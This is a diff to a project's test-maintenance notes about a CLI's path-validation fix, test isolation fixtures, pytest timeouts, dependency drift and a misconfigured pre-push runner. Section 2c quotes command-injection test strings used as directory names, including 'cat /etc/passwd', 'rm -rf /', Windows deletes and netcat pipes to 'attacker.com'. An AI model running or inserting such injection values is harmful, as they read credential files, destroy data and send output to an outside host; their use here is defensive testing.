@@ -135,6 +135,53 @@ training embedding matrix, so a glob would accept a folder missing the actual tr
 
 This does **not** affect the 36 failures in item 2: those fixtures contain no embeddings at all.
 
+### 2c. The suite littered the repo, and the security tests hid it — FIXED 2026-08-19
+
+Nine directories were found **tracked in git**, each holding a `command.txt`:
+
+```
+`cat /etc/passwd`        $(whoami)_output          "output; rm -rf /"
+"$(cat /etc/passwd)"     `malicious command`       'file | nc attacker.com'
+'input && del C:\\Windows'  folder | nc attacker.com 80   output && del C:\Windows
+```
+
+Created 2026-07-31 by running `tests/enhanced-cli-typer/` from the repo root, committed in
+`9327b6a` (branch-only, so a squash-merge of PR #5 keeps them out of `main`). A Windows checkout
+would likely fail on those names outright.
+
+Three separate defects, all fixed:
+
+1. **The CLI created any directory it was handed.** `save_command_to_output_folder`
+   (`emuses/cli/main.py`) calls `output_folder.mkdir(parents=True, exist_ok=True)` and was the
+   *first statement* of `full()`. `validate_path` already existed in `emuses/cli/security.py` and
+   was simply never applied to output folders. `validate_output_folder()` now runs at that single
+   creation point — one guard covering all four commands rather than four call-site checks.
+   Malicious paths exit 2 and create nothing; legitimate paths are untouched.
+2. **The tests meant to catch this asserted nothing useful.**
+   `test_typer_command_injection_prevention` and `test_argument_parsing_with_quotes` asserted
+   `result.exit_code != 0 or "error" in result.output.lower()`, which passed because the command
+   failed for an unrelated reason (missing input file / HTTP error) while the directory was still
+   created. They would have passed with path validation deleted outright. They now assert the
+   rejection specifically **and that nothing lands on disk** — the second assertion is the one with
+   teeth. Confirmed by stashing the fix: 2 failed / 28 passed without it, 30 passed with it.
+3. **Nothing isolated the filesystem.** 17 files use `CliRunner`; `isolated_filesystem()` appeared
+   **zero** times. `tests/conftest.py` now has two autouse fixtures: `_isolate_cwd` runs every test
+   in `tmp_path`, and `_no_repo_pollution` fails the session naming any new entry in the repo root.
+   A test needing the real root opts in through the `repo_cwd` fixture.
+
+Safe to apply globally, measured rather than assumed: no test refers to `test_data/` by bare
+relative path (all derive from `PROJECT_ROOT` or `__file__`), and the four that touch the cwd either
+manage it themselves or patch `Path.cwd`. `tests/cli` failure sets are byte-identical with and
+without the change (19 failed / 58 passed either way).
+
+**Residual, deliberately left alone**: `test_special_characters_in_arguments` in the same file
+still uses the tolerant `exit_code != 0 or "error" in output` assertion. It is a weaker test than it
+looks, but not a false-assurance case like the two above — its payloads go to `input_dataset`, not
+the output folder, so nothing is created from them, and three of them (`file{expansion}.csv`,
+`data[bracket].txt`, `file(parenthesis).csv`) are legitimate filenames that *should* be accepted.
+Tightening it means first deciding whether input paths get the same validation as output paths,
+which carries real compatibility risk. Not done here.
+
 ### 3. Slow-but-passing tests (P3)
 
 Not broken, but they dominate runtime. `enhanced-cli-typer` alone:
@@ -143,7 +190,65 @@ Not broken, but they dominate runtime. `enhanced-cli-typer` alone:
 
 Much of this is real retry/backoff delay being waited out. Injecting the backoff parameters, or
 marking these `@pytest.mark.slow` and excluding them from the default run, would cut the suite
-substantially. `pytest.ini` already declares a `slow` marker that nothing uses.
+substantially.
+
+Partly addressed on 2026-08-19: `test_performance_stress.py` now carries
+`pytestmark = [pytest.mark.slow, pytest.mark.timeout(120)]`, so the `slow` marker `pytest.ini`
+declares is finally used by something and `-m "not slow"` cuts the worst 163s. Note
+`test_security_validation.py` dropped 43s → 20s for free once the CLI started rejecting malicious
+output paths instead of taking them through the whole service-client path (§2c). The remaining
+files are unmarked.
+
+### 3b. `test_performance_stress.py` — hang not reproducible; net installed anyway (2026-08-19)
+
+An orphaned run of this file from 2026-07-31 was found still alive on 2026-08-06, blocked in
+`ep_poll` after **6 days 11 hours** — despite having been started with
+`--timeout=20 --timeout-method=thread`. It was single-threaded by then, so pytest-timeout's watchdog
+was already gone.
+
+**The hang does not reproduce on current code.** The file runs to completion in ~163s, the process
+exits cleanly, and nothing survives it. Stated plainly because it matters: the cause was not
+identified. The most likely explanation is that the orphan was wedged in *interpreter shutdown*
+rather than in a test body — a single thread in `ep_poll` with the watchdog already cancelled fits
+teardown, not a running test — which points at the `atexit`/`QueueListener`/`mp.Queue` family fixed
+in `b611686` and `a7b3283`. That cannot be proven retroactively and is not claimed as fact.
+
+**Net installed regardless**, since the failure mode costs six days of a machine:
+`pytest.ini` now sets `timeout = 600` with `timeout_method = thread` as a global floor, and the file
+carries `pytestmark = [pytest.mark.slow, pytest.mark.timeout(120)]`. Verified with a probe test
+blocked in `socket.accept()` — the orphan's exact signature — which pytest-timeout now kills.
+
+**Both of the file's long-standing failures are fixed**, taking it from 2 failed/14 passed to
+**16 passed**:
+
+- `test_execution_time_comparison` divided the measured time by a hardcoded
+  `simulated_legacy_time = 2.0` and asserted the ratio was `<= 2.1`. No legacy CLI was executed —
+  it lives in `_archive_legacy` — so this was an absolute "finish within 4.2s" assertion dressed as
+  a benchmark, and it failed on a busy machine (measured 3.09x). Removed; the absolute
+  `new_cli_time < 10.0` assertion on the next line was doing the real work all along.
+- `test_feature_parity_validation` failed with `KeyError: 'umap_trials'` because it asserted against
+  the top level of the submitted payload. The payload is an envelope
+  (`{job_name, description, pipeline_config}`) and the parameters live in `pipeline_config`.
+  Verified against a real call that all six are forwarded correctly, so the CLI was right and the
+  test was reading the wrong level.
+
+### 3c. The service-spawn leak is real but the tests do not reach it (2026-08-19, verified)
+
+Worth recording because it looks alarming and the obvious conclusion is wrong.
+
+`emuses/cli/service_manager.py:236` spawns a **detached** uvicorn subprocess
+(`start_new_session=True`), and its only cleanup is `atexit.register(self._cleanup_on_exit)` at
+`:78`. `tests/conftest.py::mock_atexit_register` is autouse and swallows every `atexit.register`
+during tests — the same fixture that silently broke the log-listener shutdown (§4). So on paper,
+any test reaching that path leaks a uvicorn that outlives the run forever.
+
+**Measured: the suite does not reach it.** Running the CLI tests produces no service-startup output
+and leaves no `uvicorn` process or listening port behind. Invoking `_full_async` *outside* pytest
+does start a real service — and shuts it down cleanly on exit, because `atexit` is not mocked there.
+
+So the landmine exists but is not currently armed by the test suite. `mock_atexit_register` is
+**left alone** on that basis. If a future test does reach the spawn path, this is the first thing to
+check.
 
 ### 4. Leaked QueueListener threads abort the interpreter — FIXED 2026-07-31 (was P1)
 
@@ -259,6 +364,40 @@ Probably unintended.
 Six files under `tests/enhanced-cli-typer/` invoke `subprocess`. `CLAUDE.md` states: "Never run
 `subprocess.run(["pytest", ...])` from within test files." Worth auditing which of those spawn
 pytest specifically, since that both slows runs and escapes `pytest-timeout`.
+
+### 7. The local env has drifted from the lockfiles again (P3, observed 2026-08-19)
+
+88 of the pins in `requirements-dev.txt` do not match what is installed locally — mostly patch-level
+(`anyio` 4.9.0 pinned / 4.11.0 installed) but not all: `fastapi-users` is pinned at 15.0.4 with
+**14.0.1** installed, a major version behind, and `fastapi` 0.116.1 pinned / 0.118.0 installed.
+
+This means **local green does not imply CI green**, in either direction, and every count in this
+file is a measurement of the local environment rather than of the pinned one. Not acted on here.
+Re-pin or re-sync deliberately, rather than as a side effect of some other change.
+
+Found while adding `pytest-timeout` to `requirements-dev.in` — it was installed locally but declared
+nowhere, so `pytest.ini`'s new `timeout = 600` would have been silently ignored on CI. Same shape as
+the undeclared `aiosqlite` found earlier: the environment quietly had something the lockfile did not.
+
+### 8. The pre-push gate was testing the wrong environment — FIXED 2026-08-19
+
+`scripts/dev_test_runner.py` ran bare `python` and `pytest` through `shell=True`, so it used
+whatever came first on `PATH`. On this machine that is **miniforge3, Python 3.12, pytest 9.0.2** —
+not the project's `emuses` env (miniconda3, Python 3.11, pytest 8.4.2) that the test suite actually
+runs in.
+
+So the gate everyone is told to trust before pushing ("Pre-push: `python scripts/dev_test_runner.py`"
+in `CLAUDE.md`) was validating a different interpreter, a different pytest major version, and a
+different set of installed packages — while reporting a reassuring 13/13 throughout all of the work
+in this document.
+
+Caught by accident: after adding `timeout = 600` to `pytest.ini`, the gate emitted
+`PytestConfigWarning: Unknown config option: timeout` from a `miniforge3/lib/python3.12` path. The
+warning was the only visible symptom, and only because `pytest-timeout` is absent from that
+installation.
+
+Fixed by running `sys.executable -m pytest` / `-m py_compile` instead of bare names. Both
+environments happen to pass 13/13, so nothing was being hidden — but that was luck, not design.
 
 ## Measured failure counts (post-dependency-install)
 
